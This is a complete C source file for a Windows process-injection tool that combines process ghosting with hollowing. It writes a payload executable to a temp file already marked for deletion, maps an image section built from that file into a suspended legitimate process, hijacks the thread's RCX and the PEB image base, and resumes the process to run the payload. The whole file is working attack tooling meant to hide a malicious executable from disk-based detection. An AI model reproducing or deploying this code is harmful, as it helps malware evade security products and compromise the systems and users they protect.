# include <stdio.h>
# include "definitions.h"

# define MSG( msg, ... ) \
	printf( "[+] " msg "\n", ##__VA_ARGS__ )

# define PUTS( msg, ... ) \
	printf( "[-] " msg "\n", ##__VA_ARGS__ ); \
	return -1;
	
# define API_FPUTS( api, msg, ... ) \
	printf( "[-] " api " failed with error: %d\n\tMSG > " msg "\n", GetLastError(), ##__VA_ARGS__ ); \
	goto Cleanup

# define NT_PUTS( api, msg, ... ) \
	printf( "[-] " api " failed with error: 0x%0.8X\n\tMSG > " msg "\n", Status, ##__VA_ARGS__ ); \
	goto Cleanup

NTSTATUS Status;

int main ( int argc, char* argv[] )
{
	void						 *hProcess = 0, *hSection = 0, *hPayloadFile = 0, *pLocalPayloadBuffer = 0, *hTempFile = 0, 
						         *hNtdll, *pRemotePayload = 0;
	char						 *pPayloadFilename, *pHollowProcess, *pCwd;
	unsigned long				 ulFileSize, ulThreadId = 0, ulFlags = CREATE_SUSPENDED;
	unsigned long long			 Base = 0, End = 0;
	int							 Succeeded = 0;
	size_t						 Total = 0, Written = 0, ViewSize = 0, BytesWritten = 0;
	wchar_t					     TempFilepath[ MAX_PATH ] = { 0 }, NtObjectPath[ MAX_PATH ] = L"\\??\\";
	
	NTSTATUS					 Status				 = 0;
	PIMAGE_NT_HEADERS			 PayloadNtHeader	 = { 0 };
	UNICODE_STRING				 Filename			 = { 0 };
	OBJECT_ATTRIBUTES			 OA					 = { 0 };
	IO_STATUS_BLOCK				 IOBlock			 = { 0 };
	FILE_DISPOSITION_INFO		 FileData			 = { 0 };
	STARTUPINFOA				 TargetProcStartInfo = { 0 };
	PROCESS_INFORMATION			 TargetProcess		 = { 0 };
	CONTEXT						 Ctx				 = { .ContextFlags = CONTEXT_ALL };

	if ( argc != 4 )
	{
		printf( "[-] USAGE: %s <path/to/payload.exe> <path/to/hollow.exe & arguments> <current/working/directory>\n", argv[0] );
		return -1;
	}
	pPayloadFilename = argv[1];
	pHollowProcess	 = argv[2];
	pCwd			 = argv[3];

	if ( ( hNtdll = LoadLibraryA( "ntdll.dll" ) ) == NULL )
	{
		API_FPUTS( "LoadLibraryA", "Could not load ntdll for syscall retrieval" );
	}

	fNtSetInformationFile	NtSetInformationFile = ( fNtSetInformationFile )GetProcAddress( hNtdll, "NtSetInformationFile" );
	fRtlInitUnicodeString	RtlInitUnicodeString = ( fRtlInitUnicodeString )GetProcAddress( hNtdll, "RtlInitUnicodeString" );
	fNtOpenFile				NtOpenFile			 = ( fNtOpenFile )GetProcAddress( hNtdll, "NtOpenFile" );
	fNtWriteFile			NtWriteFile			 = ( fNtWriteFile )GetProcAddress( hNtdll, "NtWriteFile" );
	fNtCreateSection		NtCreateSection		 = ( fNtCreateSection )GetProcAddress( hNtdll, "NtCreateSection" );
	fNtMapViewOfSection     NtMapViewOfSection   = ( fNtMapViewOfSection )GetProcAddress( hNtdll, "NtMapViewOfSection" );

	/*
		Step 1: Read testing payload from user
	*/
	if ( ( hPayloadFile = CreateFileA( pPayloadFilename, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0 ) ) == INVALID_HANDLE_VALUE )
	{
		API_FPUTS( "CreateFileA", "Could not get a handle to input file -> %s", pPayloadFilename );
	}
	if ( ( ulFileSize = GetFileSize( hPayloadFile, 0 ) ) == INVALID_FILE_SIZE )
	{
		API_FPUTS( "GetFileSize", "Could not get size of %s", pPayloadFilename );
	}
	if ( ( pLocalPayloadBuffer = VirtualAlloc( 0, ulFileSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) ) == NULL )
	{
		API_FPUTS( "VirtualAlloc", "Could not allocate %d bytes for %s", ulFileSize, pPayloadFilename );
	}
	if ( !ReadFile( hPayloadFile, pLocalPayloadBuffer, ulFileSize, 0, 0 ) )
	{
		API_FPUTS( "ReadFile", "Could not read %s to %d byte buffer at 0x%p", pPayloadFilename, ulFileSize, pLocalPayloadBuffer );
	}
	if ( ( ( PIMAGE_DOS_HEADER )pLocalPayloadBuffer )->e_magic != IMAGE_DOS_SIGNATURE )
	{
		PUTS( "Input file is not executable. Provide executable file." );
	}
	PayloadNtHeader = ( PIMAGE_NT_HEADERS )( ( unsigned long long )pLocalPayloadBuffer + ( ( PIMAGE_DOS_HEADER )pLocalPayloadBuffer )->e_lfanew );
	MSG( "Read %d bytes from %s to buffer at 0x%p", ulFileSize, pPayloadFilename, pLocalPayloadBuffer );
	if ( PayloadNtHeader->OptionalHeader.Subsystem & IMAGE_SUBSYSTEM_WINDOWS_CUI )
	{
		ulFlags = ulFlags | CREATE_NEW_CONSOLE;
	}

	/*
		Step 2: Create a temporary file in the current directory
	*/
	GetCurrentDirectoryW( MAX_PATH, ( wchar_t* )TempFilepath );
	if ( GetTempFileNameW( TempFilepath, L"GST", 0, ( wchar_t* )TempFilepath ) == 0 )
	{
		API_FPUTS( "GetTempFileNameW", "Could not create a temporary file in the current directory" );
	}
	MSG( "Created a temporary file at the path %S", TempFilepath );


	/*
		Step 3: Place temporary file into a delete pending state
	*/
	wcscat_s( NtObjectPath, MAX_PATH, TempFilepath );
	RtlInitUnicodeString( &Filename, NtObjectPath );
	InitializeObjectAttributes( &OA, &Filename, OBJ_CASE_INSENSITIVE, 0, 0 );
	if ((Status = NtOpenFile(
		&hTempFile,
		DELETE | SYNCHRONIZE | GENERIC_READ | GENERIC_WRITE,
		&OA,
		&IOBlock,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		FILE_SUPERSEDE | FILE_SYNCHRONOUS_IO_NONALERT
	)) != 0x0)
	{
		NT_PUTS( "NtOpenFile", "Could not open a handle to the temporary file." );
	}

	FileData.DeleteFileW = TRUE;
	if ( ( Status = NtSetInformationFile( hTempFile, &IOBlock, &FileData, sizeof( FileData ), 13 ) ) != 0x0 )
	{
		NT_PUTS( "NtSetInformationFile", "Could not put temp file into delete-pending state" );
	}
	MSG( "Placed temp file into delete pending state. File will be deleted on handle closure." );

	/*
		Step 4; Write the payload to the temporary file
	*/
	if ( ( Status = NtWriteFile( hTempFile, 0, 0, 0, &IOBlock, pLocalPayloadBuffer, ulFileSize, 0, 0 ) ) )
	{
		NT_PUTS( "NtWriteFile", "Could not write payload to temporary file" );
	}
	MSG( "Wrote payload to temporary file" );

	/*
		Step 5: Create a section from the temp file, close the handle to temp file to delete file.
	*/
	if ( ( Status = NtCreateSection( &hSection, SECTION_ALL_ACCESS, 0, 0, PAGE_READONLY, SEC_IMAGE, hTempFile ) ) != 0x0 )
	{
		NT_PUTS( "NtCreateSection", "Could not create image section from temp file" );
	}
	CloseHandle( hTempFile );
	MSG( "Opened image section containing payload from temp file & deleted temp file" );
	
	/*
		Step 6: Create a target process in a suspended state
				Note: 
	*/
	if ( !CreateProcessA( 0, pHollowProcess, 0, 0, TRUE, ulFlags, 0, pCwd, &TargetProcStartInfo, &TargetProcess ) )
	{
		API_FPUTS( "CreateProcessA", "Couldn't create a target process to hollow." );
	}
	MSG( "Spawned target process %s with pid %d", pHollowProcess, TargetProcess.dwProcessId );

	/*
		Step 7: Map the payload section into the target process
	*/
	if ( ( Status = NtMapViewOfSection( hSection, TargetProcess.hProcess, &pRemotePayload, 0, 0, 0, &ViewSize, 2, 0, PAGE_READONLY ) ) != 0x0 )
	{
		NT_PUTS( "NtMapViewOfSection", "Could not map payload section to target process" );
	}
	MSG( "Mapped ghost section to process @ %d", TargetProcess.dwProcessId );

	/*
		Step 8: Overwrite RCX in target process with entry point of payload (thread hijacking)
				Note: RDX holds PEB address when spawning suspended process. RCX holds the entry point
				      of the image
	*/
	if ( !GetThreadContext( TargetProcess.hThread, &Ctx ) )
	{
		API_FPUTS( "GetThreadContext", "Could not get thread context for target process %d", TargetProcess.dwProcessId );
	}
	MSG( "Payload entry point is 0x%p", ( char* )pRemotePayload + PayloadNtHeader->OptionalHeader.AddressOfEntryPoint );
	
	Ctx.Rcx = ( unsigned long long )pRemotePayload + PayloadNtHeader->OptionalHeader.AddressOfEntryPoint;

	if ( !SetThreadContext( TargetProcess.hThread, &Ctx ) )
	{
		API_FPUTS( "SetThreadContext", "Could not set thread context for target process %d",  TargetProcess.dwProcessId );
	}
	MSG( "Overwrote RCX in target process with payload entry point" );

	/*
		Step 9: Overwrite the image base address in the PEB with the base address of the payload
	*/
	if ( !WriteProcessMemory( TargetProcess.hProcess, &( ( PPEB )Ctx.Rdx )->ImageBaseAddress, &pRemotePayload, sizeof( void* ), &BytesWritten ) )
	{
		API_FPUTS( "WriteProcessMemory", "Could not overwrite peb->imageBaseAddress" );
	}
	MSG( "Overwrote image base address with payload entry point in target process peb" );

	/*
		Step 10: Resume the target process to execute the payload
	*/
	ResumeThread( TargetProcess.hThread );
	Succeeded = TRUE;
	MSG( "Resumed remote process to execute payload!" );

Cleanup:
	if ( hPayloadFile )
		CloseHandle( hPayloadFile );

	if ( pLocalPayloadBuffer )
		VirtualFree( pLocalPayloadBuffer, 0, MEM_RELEASE );

	if ( hSection )
		CloseHandle( hSection );

	if ( TargetProcess.hProcess && !Succeeded )
		TerminateProcess( TargetProcess.hProcess, 0 );

	MSG( "Cleanly finished." );
	return 0;
}